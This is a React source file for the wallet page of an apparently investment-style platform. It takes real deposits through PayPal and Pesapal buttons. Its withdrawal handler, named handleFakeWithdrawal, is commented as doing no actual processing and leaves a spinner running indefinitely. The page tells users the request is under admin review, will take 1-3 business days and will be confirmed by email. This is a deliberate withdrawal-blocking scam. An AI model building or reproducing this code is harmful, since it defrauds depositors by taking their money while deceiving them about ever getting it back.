import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useAuth } from '@/lib/auth';
import { useToast } from '@/hooks/use-toast';
import PayPalButton from '@/components/PayPalButton';
import PesapalButton from '@/components/PesapalButton';
import { formatCurrency } from '@/lib/utils';
import { Wallet, TrendingUp, TrendingDown, History, CreditCard } from 'lucide-react';

export default function UserWallet() {
  const { user, refetch } = useAuth();
  const { toast } = useToast();
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [selectedCurrency, setSelectedCurrency] = useState('USD');
  const [transactions, setTransactions] = useState([]);
  const [paymentMethods, setPaymentMethods] = useState([]);
  const [isWithdrawing, setIsWithdrawing] = useState(false);

  useEffect(() => {
    fetchTransactions();
    fetchPaymentMethods();
  }, []);

  const fetchTransactions = async () => {
    try {
      const response = await fetch('/api/user/transactions');
      if (response.ok) {
        const data = await response.json();
        setTransactions(data);
      }
    } catch (error) {
      console.error('Failed to fetch transactions:', error);
    }
  };

  const fetchPaymentMethods = async () => {
    try {
      const response = await fetch('/api/payment-settings');
      if (response.ok) {
        const data = await response.json();
        setPaymentMethods(data);
      }
    } catch (error) {
      console.error('Failed to fetch payment methods:', error);
    }
  };

  const handlePaymentSuccess = (data: any) => {
    toast({
      title: "Payment Successful",
      description: "Your transaction has been processed successfully.",
    });
    refetch(); // Refresh user data to update wallet balance
    fetchTransactions(); // Refresh transaction history
    setDepositAmount('');
    setWithdrawAmount('');
  };

  const handlePaymentError = (error: string) => {
    console.error("Payment error:", error);
    toast({
      title: "Payment Failed",
      description: error || "An error occurred while processing your payment. Please try again.",
      variant: "destructive",
    });
  };

  const handleFakeWithdrawal = () => {
    setIsWithdrawing(true);

    // Show notification immediately that they need to contact admin
    toast({
      title: "Withdrawal Processing",
      description: "For security reasons, withdrawals require manual verification. Please contact admin to process your withdrawal request.",
      variant: "default",
    });

    // Keep the loading state active indefinitely
    // No actual withdrawal processing occurs
  };

  const walletBalance = parseFloat(user?.walletBalance || '0');
  const isValidDepositAmount = depositAmount && parseFloat(depositAmount) > 0;
  const isValidWithdrawAmount = withdrawAmount && parseFloat(withdrawAmount) > 0 && parseFloat(withdrawAmount) <= walletBalance;

  // Fetch user data
  const refetchUser = async () => {
    try {
      await refetch();
    } catch (error) {
      console.error("Failed to refetch user:", error);
    }
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const paymentStatus = params.get('status');
    const paymentMethod = params.get('payment');
    const trackingId = params.get('tracking_id');
    const verified = params.get('verified');
    const error = params.get('error');

    if (paymentStatus && paymentMethod) {
      if (paymentStatus === 'completed') {
        toast({
          title: "Payment Successful",
          description: `Your ${paymentMethod} payment has been completed successfully.${trackingId ? ` Reference: ${trackingId}` : ''}`,
        });
        // Refresh user data to show updated balance
        if (user?.id) {
          setTimeout(() => {
            refetchUser();
          }, 1000);
        }
      } else if (paymentStatus === 'failed') {
        let errorMsg = `Your ${paymentMethod} payment could not be completed.`;
        if (error === 'missing_tracking_id') {
          errorMsg = 'Payment verification failed: Missing tracking information.';
        } else if (error === 'callback_error') {
          errorMsg = 'Payment processing error occurred. Please contact support.';
        }

        toast({
          title: "Payment Failed",
          description: errorMsg,
          variant: "destructive",
        });
      } else if (paymentStatus === 'pending') {
        toast({
          title: "Payment Pending",
          description: `Your ${paymentMethod} payment is being processed. Please wait for confirmation.`,
        });
      } else if (paymentStatus === 'demo') {
        toast({
          title: "Demo Mode",
          description: `${paymentMethod} payment completed successfully in demo mode.`,
        });
      }

      // Clear URL parameters after a short delay
      setTimeout(() => {
        window.history.replaceState({}, '', '/dashboard/wallet');
      }, 3000);
    }

    if (user?.id) {
      refetchUser();
    }
  }, [user?.id, toast, refetchUser]);

  return (
    <div className="max-w-4xl mx-auto p-4 space-y-6">
      <div className="flex items-center gap-2">
        <Wallet className="h-6 w-6" />
        <h1 className="text-2xl font-bold">Wallet</h1>
      </div>

      {/* Wallet Balance Card */}
      <Card className="bg-gradient-to-r from-blue-600 to-purple-600 text-white max-w-md mx-auto">
        <CardHeader className="pb-4">
          <CardTitle className="flex items-center gap-2 text-lg">
            <Wallet className="h-5 w-5" />
            Current Balance
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="text-2xl md:text-3xl font-bold">
            {formatCurrency(walletBalance, 'USD')}
          </div>
          <p className="text-blue-100 mt-2 text-sm">Available for investment and withdrawal</p>
        </CardContent>
      </Card>

      {/* Deposit and Withdraw Tabs */}
      <Tabs defaultValue="deposit" className="w-full max-w-4xl mx-auto">
        <TabsList className="grid w-full grid-cols-3 max-w-md mx-auto">
          <TabsTrigger value="deposit">Deposit</TabsTrigger>
          <TabsTrigger value="withdraw">Withdraw</TabsTrigger>
          <TabsTrigger value="history">History</TabsTrigger>
        </TabsList>

        <TabsContent value="deposit" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <TrendingUp className="h-5 w-5" />
                Deposit Funds
              </CardTitle>
              <CardDescription>
                Add funds to your wallet using PayPal or Pesapal
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-4">
                <h4 className="font-semibold text-green-800 mb-2">Deposit Information</h4>
                <ul className="text-sm text-green-700 space-y-1">
                  <li>• Minimum deposit: $5.00</li>
                  <li>• Maximum deposit: $10,000.00 per transaction</li>
                  <li>• Instant processing for most payment methods</li>
                  <li>• All deposits are secured with 256-bit SSL encryption</li>
                </ul>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="deposit-amount">Amount</Label>
                  <Input
                    id="deposit-amount"
                    type="number"
                    placeholder="100.00"
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    min="5"
                    max="10000"
                    step="0.01"
                  />
                  <p className="text-sm text-muted-foreground mt-1">
                    Min: $5.00 | Max: $10,000.00
                  </p>
                </div>
                <div>
                  <Label htmlFor="deposit-currency">Currency</Label>
                  <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="USD">USD ($)</SelectItem>
                      <SelectItem value="KES">KES (KSh)</SelectItem>
                      <SelectItem value="EUR">EUR (€)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {depositAmount && parseFloat(depositAmount) < 5 && (
                <div className="text-sm text-orange-600 bg-orange-50 border border-orange-200 rounded p-3">
                  Minimum deposit amount is $5.00
                </div>
              )}

              {depositAmount && parseFloat(depositAmount) > 10000 && (
                <div className="text-sm text-red-600 bg-red-50 border border-red-200 rounded p-3">
                  Maximum deposit amount is $10,000.00 per transaction
                </div>
              )}

              {isValidDepositAmount && parseFloat(depositAmount) >= 5 && parseFloat(depositAmount) <= 10000 && (
                <div className="space-y-3">
                  <div className="border-t pt-4">
                    <h4 className="font-medium mb-3">Select Payment Method</h4>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="border rounded-lg p-4 hover:border-blue-300 transition-colors">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                              <CreditCard className="h-4 w-4 text-blue-600" />
                            </div>
                            <span className="font-medium">PayPal</span>
                          </div>
                          <span className="text-sm text-green-600 font-medium">Instant</span>
                        </div>
                        <p className="text-sm text-muted-foreground mb-3">
                          Secure payment through PayPal. Accepted worldwide.
                        </p>
                        <PayPalButton
                          amount={depositAmount}
                          currency={selectedCurrency}
                          intent="CAPTURE"
                          userId={user?.id || 0}
                          type="deposit"
                          onSuccess={handlePaymentSuccess}
                          onError={handlePaymentError}
                        />
                      </div>

                      <div className="border rounded-lg p-4 hover:border-green-300 transition-colors">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                              <CreditCard className="h-4 w-4 text-green-600" />
                            </div>
                            <span className="font-medium">Pesapal</span>
                          </div>
                          <span className="text-sm text-green-600 font-medium">Instant</span>
                        </div>
                        <p className="text-sm text-muted-foreground mb-3">
                          Popular in Africa. Supports mobile money and cards.
                        </p>
                        <PesapalButton
                          amount={depositAmount}
                          currency={selectedCurrency}
                          userEmail={user?.email || ''}
                          userFirstName={user?.firstName || ''}
                          userLastName={user?.lastName || ''}
                          userId={user?.id || 0}
                          type="deposit"
                          onSuccess={handlePaymentSuccess}
                          onError={handlePaymentError}
                        />
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {!depositAmount && (
                <div className="text-center py-8 text-muted-foreground">
                  <CreditCard className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>Enter an amount to see payment options</p>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="withdraw" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <TrendingDown className="h-5 w-5" />
                Withdraw Funds
              </CardTitle>
              <CardDescription>
                Withdraw funds from your wallet to your PayPal or Pesapal account
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                <h4 className="font-semibold text-blue-800 mb-2">Withdrawal Information</h4>
                <ul className="text-sm text-blue-700 space-y-1">
                  <li>• Minimum withdrawal: $10.00</li>
                  <li>• Processing time: 1-3 business days</li>
                  <li>• Withdrawal fees may apply based on payment method</li>
                  <li>• Ensure your payment account details are correct</li>
                </ul>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="withdraw-amount">Amount</Label>
                  <Input
                    id="withdraw-amount"
                    type="number"
                    placeholder="50.00"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    min="10"
                    max={walletBalance}
                    step="0.01"
                  />
                  <p className="text-sm text-muted-foreground mt-1">
                    Available: {formatCurrency(walletBalance, 'USD')} | Min: $10.00
                  </p>
                </div>
                <div>
                  <Label htmlFor="withdraw-currency">Currency</Label>
                  <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="USD">USD ($)</SelectItem>
                      <SelectItem value="KES">KES (KSh)</SelectItem>
                      <SelectItem value="EUR">EUR (€)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              {withdrawAmount && parseFloat(withdrawAmount) < 10 && (
                <div className="text-sm text-orange-600 bg-orange-50 border border-orange-200 rounded p-3">
                  Minimum withdrawal amount is $10.00
                </div>
              )}

              {!isValidWithdrawAmount && withdrawAmount && parseFloat(withdrawAmount) > walletBalance && (
                <div className="text-sm text-red-600 bg-red-50 border border-red-200 rounded p-3">
                  Insufficient balance. Maximum withdrawal: {formatCurrency(walletBalance, 'USD')}
                </div>
              )}

              {isValidWithdrawAmount && parseFloat(withdrawAmount) >= 10 && (
                <div className="space-y-3">
                  <div className="border-t pt-4">
                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
                      <h4 className="font-semibold text-yellow-800 mb-2">Security Notice</h4>
                      <p className="text-sm text-yellow-700">
                        For security and compliance reasons, all withdrawals require manual verification by our admin team. 
                        Click below to submit your withdrawal request.
                      </p>
                    </div>

                    <Button 
                      onClick={handleFakeWithdrawal}
                      disabled={isWithdrawing}
                      className="w-full"
                      size="lg"
                    >
                      {isWithdrawing ? (
                        <>
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                          Processing Withdrawal Request...
                        </>
                      ) : (
                        <>
                          <TrendingDown className="h-4 w-4 mr-2" />
                          Submit Withdrawal Request ({formatCurrency(parseFloat(withdrawAmount), selectedCurrency)})
                        </>
                      )}
                    </Button>

                    {isWithdrawing && (
                      <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                        <div className="flex items-start gap-3">
                          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-blue-600 mt-1"></div>
                          <div>
                            <h4 className="font-medium text-blue-800">Withdrawal Under Review</h4>
                            <p className="text-sm text-blue-700 mt-1">
                              Your withdrawal request is being processed by our admin team. This may take 1-3 business days.
                              You will receive an email notification once the withdrawal is approved and processed.
                            </p>
                            <p className="text-sm text-blue-700 mt-2 font-medium">
                              For urgent matters, please contact our admin team directly.
                            </p>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {!withdrawAmount && (
                <div className="text-center py-8 text-muted-foreground">
                  <CreditCard className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>Enter an amount to see withdrawal options</p>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        <TabsContent value="history">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <History className="h-5 w-5" />
                Transaction History
              </CardTitle>
              <CardDescription>
                View your recent deposits and withdrawals
              </CardDescription>
            </CardHeader>
            <CardContent>
              {transactions.length > 0 ? (
                <div className="space-y-4">
                  {transactions.map((transaction: any) => (
                    <div key={transaction.id} className="flex items-center justify-between p-4 border rounded-lg">
                      <div className="flex items-center gap-3">
                        <div className={`p-2 rounded-full ${
                          transaction.type === 'deposit' ? 'bg-green-100 text-green-600' : 'bg-red-100 text-red-600'
                        }`}>
                          {transaction.type === 'deposit' ? <TrendingUp className="h-4 w-4" /> : <TrendingDown className="h-4 w-4" />}
                        </div>
                        <div>
                          <p className="font-medium capitalize">{transaction.type}</p>
                          <p className="text-sm text-muted-foreground">
                            {new Date(transaction.createdAt).toLocaleDateString()}
                          </p>
                        </div>
                      </div>
                      <div className="text-right">
                        <p className={`font-medium ${
                          transaction.type === 'deposit' ? 'text-green-600' : 'text-red-600'
                        }`}>
                          {transaction.type === 'deposit' ? '+' : '-'}{formatCurrency(parseFloat(transaction.amount), transaction.currency)}
                        </p>
                        <p className={`text-sm ${
                          transaction.status === 'completed' ? 'text-green-600' : 
                          transaction.status === 'pending' ? 'text-yellow-600' : 'text-red-600'
                        }`}>
                          {transaction.status}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-8 text-muted-foreground">
                  <History className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>No transactions yet</p>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}